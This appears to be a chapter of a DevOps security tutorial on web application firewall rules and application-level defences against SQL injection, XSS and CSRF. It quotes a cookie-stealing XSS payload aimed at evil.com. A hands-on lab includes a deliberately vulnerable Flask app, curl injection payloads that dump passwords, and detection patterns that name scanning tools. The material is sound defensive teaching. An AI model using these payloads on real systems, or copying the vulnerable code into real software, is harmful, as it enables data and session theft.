# 53 - WAF Rules

**Previous:** [52 - DDoS Protection](../52-ddos-protection/README.md) | **Next:** [54 - Secrets Rotation](../54-secrets-rotation/README.md)

---

## Problem

Your application passes every security review. The code is clean. But one day, an attacker discovers they can type `' OR 1=1 --` into your search box and dump your entire user database. Or they inject `<script>document.location='https://evil.com/?c='+document.cookie</script>` into a comment field and steal session tokens from every user who views the page. Or they forge a cross-site request that transfers money from a logged-in user's account.

These are the OWASP Top 3 web application attacks:
- **SQL Injection (SQLi):** Manipulating database queries through user input
- **Cross-Site Scripting (XSS):** Injecting malicious scripts into web pages
- **Cross-Site Request Forgery (CSRF):** Tricking authenticated users into performing unwanted actions

A Web Application Firewall (WAF) sits in front of your application and inspects HTTP requests, blocking those that match known attack patterns. It is your last line of defense when application-level protections fail.

---

## Naive Way

```nginx
# "We have input validation in the application... mostly"
server {
    listen 80;
    server_name api.company.com;

    location / {
        proxy_pass http://backend;
        # No WAF, no request inspection, no filtering
        # Raw requests go straight to the application
    }
}

# In the application:
query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQLi
output = f"<div>{user_comment}</div>"  # XSS
# No CSRF token on forms
```

**Why this fails:**
- Application-level validation is inconsistent and error-prone
- One missed input field compromises the entire system
- No centralized defense against known attack patterns
- Developers must remember to sanitize every single input
- Zero-day exploits have no safety net

---

## Right Way

### AWS WAF with Managed Rule Groups

```hcl
# waf.tf - AWS WAF configuration with managed rules

resource "aws_wafv2_web_acl" "main" {
  name        = "app-waf"
  description = "WAF for production application"
  scope       = "REGIONAL"

  default_action {
    allow {}
  }

  # AWS Managed Rule: Core rule set (common attacks)
  rule {
    name     = "AWSManagedRulesCommonRuleSet"
    priority = 1

    override_action {
      none {}
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesCommonRuleSet"
        vendor_name = "AWS"
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name               = "CommonRuleSetMetric"
      sampled_requests_enabled  = true
    }
  }

  # SQL Injection protection
  rule {
    name     = "AWSManagedRulesSQLiRuleSet"
    priority = 2

    override_action {
      none {}
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesSQLiRuleSet"
        vendor_name = "AWS"
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name               = "SQLiRuleSetMetric"
      sampled_requests_enabled  = true
    }
  }

  # Known bad inputs
  rule {
    name     = "AWSManagedRulesKnownBadInputsRuleSet"
    priority = 3

    override_action {
      none {}
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesKnownBadInputsRuleSet"
        vendor_name = "AWS"
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name               = "KnownBadInputsMetric"
      sampled_requests_enabled  = true
    }
  }

  # Rate limiting per IP
  rule {
    name     = "RateLimitPerIP"
    priority = 4

    action {
      block {}
    }

    statement {
      rate_based_statement {
        limit              = 1000
        aggregate_key_type = "IP"
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name               = "RateLimitMetric"
      sampled_requests_enabled  = true
    }
  }

  visibility_config {
    cloudwatch_metrics_enabled = true
    metric_name               = "AppWAFMetric"
    sampled_requests_enabled  = true
  }
}

resource "aws_wafv2_web_acl_association" "alb" {
  resource_arn = aws_lb.app.arn
  web_acl_arn  = aws_wafv2_web_acl.main.arn
}
```

### Cloudflare WAF with Custom Rules

```hcl
# cloudflare-waf.tf

resource "cloudflare_ruleset" "custom_waf" {
  zone_id = var.cloudflare_zone_id
  name    = "Custom WAF Rules"
  kind    = "zone"
  phase   = "http_request_firewall_custom"

  rules {
    action = "block"
    expression = "(http.request.uri contains \"' OR \") or (http.request.uri contains \"UNION SELECT\") or (http.request.uri contains \"-- \")"
    description = "Block SQL injection in URI"
    enabled = true
  }

  rules {
    action = "block"
    expression = "(http.request.uri.query contains \"<script\") or (http.request.uri.query contains \"javascript:\") or (http.request.uri.query contains \"onerror=\")"
    description = "Block XSS in query parameters"
    enabled = true
  }

  rules {
    action = "block"
    expression = "(http.request.uri.path contains \"/admin\" and not ip.src in {10.0.0.0/8 172.16.0.0/12 192.168.0.0/16})"
    description = "Block admin access from external IPs"
    enabled = true
  }

  rules {
    action = "managed_challenge"
    expression = "(http.user_agent contains \"sqlmap\" or http.user_agent contains \"nikto\" or http.user_agent contains \"nmap\")"
    description = "Challenge known security scanners"
    enabled = true
  }
}
```

### Application-Level Protection (Defense in Depth)

Never rely solely on the WAF. Implement protections in the application too:

```rust
// src/security/sql_injection.rs
use sqlx::PgPool;

// WRONG: String interpolation (SQL injection vulnerable)
// let query = format!("SELECT * FROM users WHERE name = '{}'", user_input);

// RIGHT: Parameterized queries (always use these)
pub async fn find_user(pool: &PgPool, name: &str) -> Result<Vec<User>, sqlx::Error> {
    sqlx::query_as!(
        User,
        "SELECT id, name, email FROM users WHERE name = $1",
        name  // Automatically escaped by sqlx
    )
    .fetch_all(pool)
    .await
}

// RIGHT: Input validation layer
pub fn validate_input(input: &str) -> Result<String, ValidationError> {
    if input.len() > 1000 {
        return Err(ValidationError::TooLong);
    }
    if input.contains('\0') {
        return Err(ValidationError::NullByte);
    }
    if !input.chars().all(|c| c.is_alphanumeric() || c == ' ' || c == '-' || c == '_') {
        return Err(ValidationError::InvalidCharacters);
    }
    Ok(input.to_string())
}

#[derive(Debug)]
pub enum ValidationError {
    TooLong,
    NullByte,
    InvalidCharacters,
}
```

```rust
// src/security/xss.rs
use ammonia::Builder;

// Sanitize HTML output to prevent XSS
pub fn sanitize_html(input: &str) -> String {
    Builder::default()
        .add_tags(&["b", "i", "em", "strong", "p", "br", "ul", "ol", "li"])
        .add_generic_attributes(&["class"])
        .url_schemes(hashset!["http", "https", "mailto"])
        .clean(input)
        .to_string()
}

// For non-HTML contexts, escape special characters
pub fn escape_for_html(input: &str) -> String {
    input
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

// Content Security Policy header
pub fn csp_header() -> String {
    vec![
        "default-src 'self'",
        "script-src 'self' 'nonce-{random}'",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: https:",
        "font-src 'self'",
        "connect-src 'self' https://api.company.com",
        "frame-ancestors 'none'",
        "base-uri 'self'",
        "form-action 'self'",
    ].join("; ")
}
```

```rust
// src/security/csrf.rs
use axum::{
    extract::Request,
    middleware::Next,
    response::Response,
};
use uuid::Uuid;

pub fn generate_csrf_token() -> String {
    Uuid::new_v4().to_string()
}

pub async fn csrf_protection(
    request: Request,
    next: Next,
) -> Response {
    let method = request.method().clone();

    if method == "POST" || method == "PUT" || method == "DELETE" || method == "PATCH" {
        let headers = request.headers();
        let has_custom_header = headers.get("X-CSRF-Token").is_some();

        let origin = headers.get("origin").or(headers.get("referer"));
        let valid_origin = origin
            .and_then(|v| v.to_str().ok())
            .map(|v| v.starts_with("https://company.com"))
            .unwrap_or(false);

        if !has_custom_header && !valid_origin {
            return Response::builder()
                .status(403)
                .body("CSRF validation failed".into())
                .unwrap();
        }
    }

    next.run(request).await
}
```

### Security Headers Middleware

```rust
// src/middleware/security_headers.rs
use axum::{extract::Request, middleware::Next, response::Response};

pub async fn security_headers(
    request: Request,
    next: Next,
) -> Response {
    let mut response = next.run(request).await;
    let headers = response.headers_mut();

    headers.insert("X-Content-Type-Options", "nosniff".parse().unwrap());
    headers.insert("X-Frame-Options", "DENY".parse().unwrap());
    headers.insert("X-XSS-Protection", "1; mode=block".parse().unwrap());
    headers.insert("Referrer-Policy", "strict-origin-when-cross-origin".parse().unwrap());
    headers.insert(
        "Strict-Transport-Security",
        "max-age=63072000; includeSubDomains; preload".parse().unwrap(),
    );
    headers.insert(
        "Permissions-Policy",
        "camera=(), microphone=(), geolocation=(), payment=(self)".parse().unwrap(),
    );

    response
}
```

---

## Production Way

### Multi-Layer WAF Architecture

```
Internet
   |
   v
+-------------------+
| CDN Edge WAF      |  <-- Cloudflare/AWS CloudFront rules
| (Layer 7 DDoS,    |     Block volumetric attacks, bad bots
|  Bot Management)  |     Geographic restrictions
+-------------------+
   |
   v
+-------------------+
| Regional WAF      |  <-- AWS WAF / ModSecurity
| (OWASP Top 10,    |     SQL injection, XSS, CSRF
|  Custom Rules)    |     Request size limits
+-------------------+
   |
   v
+-------------------+
| Load Balancer     |  <-- Rate limiting, IP reputation
| (ALB/NLB)         |     TLS termination
+-------------------+
   |
   v
+-------------------+
| Application       |  <-- Parameterized queries, CSP headers
| Security Layer    |     Input validation, output encoding
|                   |     CSRF tokens, authentication checks
+-------------------+
   |
   v
+-------------------+
| Database          |  <-- Stored procedures, row-level security
| Security Layer    |     Least-privilege database users
+-------------------+
```

### WAF Tuning and False Positive Management

```yaml
# waf-tuning.yml - Document WAF rule exceptions

tuning_log:
  - date: "2024-01-15"
    rule: "SQLiRuleSet"
    action: "exempted_path"
    path: "/api/v2/search"
    reason: "Legitimate SQL-like syntax in search queries, added input validation in app"
    ticket: "SEC-1234"

  - date: "2024-01-20"
    rule: "XSSRuleSet"
    action: "exempted_header"
    header: "X-Custom-Data"
    reason: "Base64-encoded data triggers XSS pattern match"
    ticket: "SEC-1240"

  - date: "2024-02-01"
    rule: "RateLimit"
    action: "increased_limit"
    old_limit: 500
    new_limit: 2000
    reason: "API partner with legitimate high-volume traffic"
    ticket: "SEC-1255"
```

### WAF Monitoring and Alerting

```python
# waf_monitor.py - Monitor WAF metrics and alert on anomalies
import boto3
import os
import requests
from datetime import datetime, timedelta

class WAFMonitor:
    def __init__(self, web_acl_name: str, region: str = 'us-east-1'):
        self.waf = boto3.client('wafv2', region_name=region)
        self.cloudwatch = boto3.client('cloudwatch', region_name=region)
        self.web_acl_name = web_acl_name

    def get_blocked_requests(self, hours: int = 1) -> dict:
        response = self.cloudwatch.get_metric_statistics(
            Namespace='AWS/WAFV2',
            MetricName='BlockedRequests',
            Dimensions=[
                {'Name': 'WebACL', 'Value': self.web_acl_name},
                {'Name': 'Region', 'Value': 'us-east-1'},
                {'Name': 'Rule', 'Value': 'ALL'},
            ],
            StartTime=datetime.utcnow() - timedelta(hours=hours),
            EndTime=datetime.utcnow(),
            Period=300,
            Statistics=['Sum']
        )
        return response['Datapoints']

    def check_for_attack_spike(self, threshold: int = 100):
        blocked = self.get_blocked_requests(hours=1)
        total_blocked = sum(dp['Sum'] for dp in blocked)

        if total_blocked > threshold:
            self.send_alert(
                f"WAF Alert: {total_blocked} requests blocked in the last hour. "
                f"Possible attack in progress."
            )

    def get_top_blocked_ips(self, limit: int = 10) -> list:
        response = self.waf.get_sampled_requests(
            WebAclArn=self.get_web_acl_arn(),
            RuleMetricName='ALL',
            TimeWindow={
                'StartTime': datetime.utcnow() - timedelta(hours=1),
                'EndTime': datetime.utcnow()
            },
            MaxItems=100
        )

        ip_counts = {}
        for req in response['SampledRequests']:
            ip = req['Request']['ClientIP']
            ip_counts[ip] = ip_counts.get(ip, 0) + 1

        return sorted(ip_counts.items(), key=lambda x: x[1], reverse=True)[:limit]

    def send_alert(self, message: str):
        webhook = os.environ.get('SLACK_WEBHOOK')
        if webhook:
            requests.post(webhook, json={'text': f'[WAF] {message}'})

    def get_web_acl_arn(self) -> str:
        response = self.waf.list_web_acls(Scope='REGIONAL')
        for acl in response['WebACLs']:
            if acl['Name'] == self.web_acl_name:
                return acl['ARN']
        raise ValueError(f"Web ACL {self.web_acl_name} not found")
```

---

## Hands-On Lab

### Lab: Implement WAF Protection Against SQLi, XSS, and CSRF

**Duration:** 90 minutes

**Prerequisites:**
- A simple web application with a search feature and comment form
- Nginx as reverse proxy (or use AWS WAF if deploying to AWS)
- curl and a browser for testing

**Step 1: Deploy a Vulnerable Application**

```python
# vulnerable_app.py - Deliberately insecure app for testing
from flask import Flask, request, render_template_string, make_response
import sqlite3

app = Flask(__name__)

conn = sqlite3.connect(':memory:', check_same_thread=False)
conn.execute('CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, email TEXT, password TEXT)')
conn.execute("INSERT INTO users VALUES (1, 'admin', 'admin@company.com', 'supersecret')")
conn.execute("INSERT INTO users VALUES (2, 'alice', 'alice@company.com', 'password123')")

@app.route('/search')
def search():
    query = request.args.get('q', '')
    sql = f"SELECT * FROM users WHERE name LIKE '%{query}%'"
    results = conn.execute(sql).fetchall()
    return f"Results: {results}"

@app.route('/comment', methods=['GET', 'POST'])
def comment():
    if request.method == 'POST':
        text = request.form.get('text', '')
        return render_template_string(f"<div>Comment posted: {text}</div>")
    return '<form method="POST"><textarea name="text"></textarea><button>Post</button></form>'

@app.route('/transfer', methods=['POST'])
def transfer():
    amount = request.form.get('amount')
    to = request.form.get('to')
    return f"Transferred ${amount} to {to}"

if __name__ == '__main__':
    app.run(port=5000)
```

**Step 2: Test the Vulnerabilities (Before WAF)**

```bash
# SQL Injection: dump all users
curl "http://localhost:5000/search?q=' UNION SELECT id,name,email,password FROM users--"

# XSS: inject script
curl -X POST "http://localhost:5000/comment" \
    -d "text=<script>alert('XSS')</script>"

# CSRF: forge a transfer request
curl -X POST "http://localhost:5000/transfer" \
    -d "amount=10000&to=attacker"
```

**Step 3: Deploy ModSecurity WAF**

```bash
# Install ModSecurity with Nginx
sudo apt install libmodsecurity3 libmodsecurity3-nginx
```

```
# /etc/nginx/modsecurity/modsecurity.conf
SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess On

SecRule ARGS "@rx (?i:(\bunion\b.*\bselect\b|\bselect\b.*\bfrom\b|\binsert\b.*\binto\b|\bdelete\b.*\bfrom\b|\bdrop\b.*\btable\b|\bupdate\b.*\bset\b))" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection Attempt'"

SecRule ARGS "@rx (?i:(<script|javascript:|onerror=|onload=|onclick=))" \
    "id:1002,phase:2,deny,status:403,msg:'XSS Attempt'"

SecRule REQUEST_HEADERS:User-Agent "@pmFromFile /etc/nginx/modsecurity/bad-agents.txt" \
    "id:1003,phase:1,deny,status:403,msg:'Bad User Agent'"
```

```nginx
# /etc/nginx/sites-available/app
server {
    listen 80;
    server_name localhost;

    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsecurity/modsecurity.conf;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

**Step 4: Test with WAF Active**

```bash
# These should now be blocked with 403 Forbidden:
curl -v "http://localhost/search?q=' UNION SELECT id,name,email,password FROM users--"
# Expected: 403 Forbidden

curl -v -X POST "http://localhost/comment" \
    -d "text=<script>alert('XSS')</script>"
# Expected: 403 Forbidden

# Legitimate requests should still work
curl "http://localhost/search?q=alice"
# Expected: 200 OK with results
```

**Step 5: Add Application-Level CSRF Protection**

```python
import secrets
from functools import wraps

def csrf_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.form.get('csrf_token') or request.headers.get('X-CSRF-Token')
        if not token or token != request.cookies.get('csrf_token'):
            return 'CSRF validation failed', 403
        return f(*args, **kwargs)
    return decorated

@app.route('/transfer', methods=['POST'])
@csrf_required
def transfer():
    amount = request.form.get('amount')
    to = request.form.get('to')
    return f"Transferred ${amount} to {to}"

@app.route('/transfer', methods=['GET'])
def transfer_form():
    token = secrets.token_hex(32)
    resp = make_response(f'''
        <form method="POST">
            <input type="hidden" name="csrf_token" value="{token}">
            <input name="amount" placeholder="Amount">
            <input name="to" placeholder="To">
            <button>Transfer</button>
        </form>
    ''')
    resp.set_cookie('csrf_token', token)
    return resp
```

**Deliverable:** Document which attacks are blocked by the WAF layer vs. the application layer, and explain why defense in depth matters.

---

## Limitation

WAF rules protect against application-layer attacks, but they operate on HTTP traffic. They do not protect against threats that come from **compromised credentials**. If an attacker obtains a valid API key, database password, or service account token through a phishing attack, a leaked .env file, or a compromised CI/CD pipeline, the WAF sees legitimate-looking requests with valid authentication.

The WAF cannot distinguish between a legitimate user making API calls and an attacker using stolen credentials. The requests look identical -- correct authentication headers, normal request patterns, valid IP addresses. Once credentials are compromised, the WAF is bypassed entirely.

Secrets that sit unchanged for months or years are a ticking time bomb. Every employee who ever had access, every contractor, every CI/CD pipeline, every leaked log file -- any of these could expose credentials that grant persistent access.

---

## Next Topic

[54 - Secrets Rotation](../54-secrets-rotation/README.md) -- Learn how to implement automated credential cycling so that even if a secret is compromised, it expires before an attacker can exploit it.
